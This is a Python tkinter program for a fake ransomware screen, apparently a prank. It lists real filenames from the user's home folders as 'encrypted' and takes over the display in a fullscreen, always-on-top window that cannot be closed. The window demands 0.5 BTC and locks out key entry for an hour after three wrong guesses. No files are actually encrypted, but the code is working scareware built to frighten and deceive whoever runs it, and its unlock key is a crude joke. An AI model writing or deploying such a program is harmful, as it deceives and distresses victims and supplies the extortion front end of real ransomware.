import tkinter as tk
from tkinter import messagebox
import threading
import time
import random
from pathlib import Path

# === SETTINGS ===
DECRYPTION_KEY = "iamgay"
MAX_ATTEMPTS = 3
wrong_attempts = 0
locked_until = None  # To track when the lock expires

# === Collect real filenames (harmless) ===
SEARCH_DIRS = [
    Path.home() / "Desktop",
    Path.home() / "Documents",
    Path.home() / "Downloads",
    Path.home() / "Pictures",
    Path.home() / "Music",
    Path.home() / "Videos",
]
real_files = []
for dir_path in SEARCH_DIRS:
    if dir_path.exists():
        try:
            for item in dir_path.iterdir():
                if item.is_file() and len(real_files) < 200:
                    real_files.append(item.name)
        except PermissionError:
            pass
if not real_files:
    real_files = ["photo.jpg", "document.pdf", "video.mp4", "song.mp3", "homework.docx"] * 40
random.shuffle(real_files)

# === Main Window ===
root = tk.Tk()
root.title("ENCRYPTED")
root.configure(bg="black")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

# === Title ===
tk.Label(
    root,
    text="☠ YOUR FILES ARE ENCRYPTED ☠",
    font=("Courier New", 48, "bold"),
    fg="red",
    bg="black"
).place(x=screen_width // 2, y=80, anchor="center")

# === Instructions ===
tk.Label(
    root,
    text=(
        "Send 0.5 BTC to bc1qprank123xyz to get the decryption key.\n"
        "Type the key below to recover your files."
    ),
    font=("Arial", 22),
    fg="white",
    bg="black",
    justify="center"
).place(x=screen_width // 2, y=160, anchor="center")

# === Input Section ===
input_frame = tk.Frame(root, bg="black")
input_frame.place(x=screen_width // 2, y=300, anchor="center")
tk.Label(
    input_frame,
    text="ENTER DECRYPTION KEY:",
    font=("Courier New", 26, "bold"),
    fg="yellow",
    bg="black"
).pack(pady=(0, 10))
key_entry = tk.Entry(
    input_frame,
    font=("Courier New", 13),
    width=30,
    justify="center",
    fg="black",
    bd=3,
    relief="solid",
    highlightbackground="red",
    highlightcolor="red",
    highlightthickness=2,
    insertbackground="black"
)
key_entry.pack(pady=5)
key_entry.focus_force()

# === Lock Status Label ===
lock_label = tk.Label(
    input_frame,
    text="",
    font=("Courier New", 16),
    fg="red",
    bg="black"
)
lock_label.pack(pady=5)

# === Submit Logic ===
def check_key(event=None):
    global wrong_attempts, locked_until
    if locked_until and time.time() < locked_until:
        remaining = int((locked_until - time.time()) / 60) + 1
        messagebox.showwarning(
            "Locked",
            f"Input is locked. Try again in {remaining} minutes.",
            parent=root
        )
        return

    if key_entry.get().strip() == DECRYPTION_KEY:
        messagebox.showinfo(
            "Well Done",
            "Correct key entered.\nAccess restored.",
            parent=root
        )
        root.destroy()
    else:
        wrong_attempts += 1
        attempts_left = MAX_ATTEMPTS - wrong_attempts
        if attempts_left > 0:
            attempt_word = "attempt" if attempts_left == 1 else "attempts"
            messagebox.showerror(
                "Wrong Key",
                f"Incorrect key.\n{attempts_left} {attempt_word} left.",
                parent=root
            )
        else:
            locked_until = time.time() + 3600  # Lock for 1 hour
            messagebox.showwarning(
                "Locked",
                "Too many incorrect attempts.\nInput disabled for 1 hour.",
                parent=root
            )
            key_entry.config(state="disabled")
            decrypt_button.config(state="disabled")
            wrong_attempts = 0  # Reset attempts for next cycle
            root.after(3600000, unlock_input)  # Schedule unlock after 1 hour

def unlock_input():
    key_entry.config(state="normal")
    decrypt_button.config(state="normal")
    lock_label.config(text="")  # Clear any lock message if added

decrypt_button = tk.Button(
    input_frame,
    text="DECRYPT MY FILES",
    command=check_key,
    font=("Courier New", 18, "bold"),
    bg="#AA0000",
    fg="white",
    activebackground="#FF0000",
    width=20,
    height=1,
    bd=3,
    relief="raised"
)
decrypt_button.pack(pady=15)
key_entry.bind("<Return>", check_key)

# === Encrypted Files List ===
tk.Label(
    root,
    text="ENCRYPTED FILES:",
    font=("Courier New", 22, "bold"),
    fg="#FF4444",
    bg="black"
).place(x=screen_width // 2, y=440, anchor="center")
listbox = tk.Listbox(
    root,
    width=100,
    height=18,
    font=("Consolas", 12),
    fg="#00FF00",
    bg="#111111",
    bd=8,
    relief="sunken"
)
listbox.place(
    x=screen_width // 2,
    y=screen_height // 2 + 150,
    anchor="center"
)

# === Animation ===
def animate():
    for filename in real_files:
        time.sleep(0.1)
        listbox.insert(tk.END, f"🔒 {filename}")
        listbox.see(tk.END)
        root.update_idletasks()
    listbox.insert(tk.END, "")
    listbox.insert(tk.END, ">>> ENCRYPTION COMPLETE <<<")
    listbox.insert(tk.END, "PAY OR LOSE EVERYTHING FOREVER")

threading.Thread(target=animate, daemon=True).start()

# === Periodic Check for Lock (to update remaining time if needed) ===
def update_lock_status():
    if locked_until and time.time() < locked_until:
        remaining = int((locked_until - time.time()) / 60) + 1
        lock_label.config(text=f"Locked for {remaining} more minutes.")
    else:
        lock_label.config(text="")
    root.after(60000, update_lock_status)  # Check every minute

root.after(1000, update_lock_status)  # Start after 1 second

root.mainloop()
